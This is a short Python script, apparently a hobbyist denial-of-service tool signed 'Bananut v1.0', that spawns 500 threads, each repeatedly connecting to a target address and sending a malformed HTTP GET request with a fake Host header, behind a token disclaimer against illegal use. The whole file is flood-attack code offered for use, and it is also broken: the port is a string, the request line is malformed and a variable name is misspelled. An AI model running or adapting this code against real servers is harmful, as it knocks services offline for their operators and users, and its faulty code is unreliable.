import threading
import socket

print(
"""
    ___   ___           __
    |  '  |  '    __   /
    | | | | | |  '  '  \_
"""
    )

print(
"""
    | | | | | | | || |   \
    |__'  |__'   '__'  __/
    ________________________
    made by Bananut|v1.0
    ____________________________________
    Pleas don't use this script illegaly.
"""
    )
target = "target ip"
port = "your port"
fake_ip = "make a fake ip"

already_connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode("ascii"),(target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))
        s.close()
        
        global already_connected
        already_connectected += 1
        
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
